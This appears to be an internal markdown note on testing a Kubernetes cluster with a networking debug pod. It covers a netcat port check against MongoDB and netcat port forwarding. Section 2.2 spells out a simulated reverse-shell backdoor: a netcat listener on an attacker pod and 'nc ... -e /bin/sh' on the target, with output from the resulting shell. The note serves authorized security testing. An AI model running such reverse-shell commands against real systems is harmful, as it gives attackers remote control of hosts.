# 1 - Objective

We want to have a pod with networking tools to check connections/attacks on our existing K8S platform:

- See [github link](hhttps://github.com/leodotcloud/swiss-army-knife)
- See all the [network tools installed](https://github.com/leodotcloud/swiss-army-knife/blob/main/package/Dockerfile)
- See [quick start](https://dev.to/soerenmetje/debug-kubernetes-applications-a-swiss-army-knife-container-56id)

# 2 - Tests done

- 2.1) Check mongoDB port is open in pod
```
Get Pod IP : smk get pods -A -o wide
Connect to swiss-army-knife: kubectl exec -n mongo swiss-army-knife  -it -- /bin/bash

    netcat -v -z -w 4 10.1.26.181 27017
    Connection to 10.1.26.181 27017 port [tcp/*] succeeded!
```
- 2.2)  simulate a Reverse Shell (Backdoor) attack
```
2.2.1) Attacker machine: create a listener in attacker machine/VM/pod, for example swiss-army-knife
    nc -lvp 4444
    Listening on [0.0.0.0] (family 0, port 4444)
```
```
2.2.2) Attacked machine: reverse shell in the machine/VM/pod you want to open the backdoor
    nc swiss-army-knife-ip 4444 -e /bin/sh
```
```
2.2.3) Attacker machine: you can type any command now because you are connected to the attacked machine through reverse shell 
    Connection from 10-1-26-178.taskmaster-ikz-svc.mongo.svc.cluster.local 45981 received!
    uname -a
    Linux taskmaster-ikz-74fbdbcd84-zzjv5 5.15.153.1-microsoft-standard-WSL2 #1 SMP Fri Mar 29 23:14:13 UTC 2024 x86_64 Linux
```
- 2.3) Port Forwarding
Netcat can also be used for simple port forwarding or redirection. For instance, if you want to forward a port from one machine to another, you can do the following:
```
Forward Port  80 to Another App Machine in forward-port-server:
    nc -lk 80 | nc target_app_host 8080

Outsite: curl http://forward-port-server

In forward-port-server:
    tcpdump -i eth0 tcp port 80

```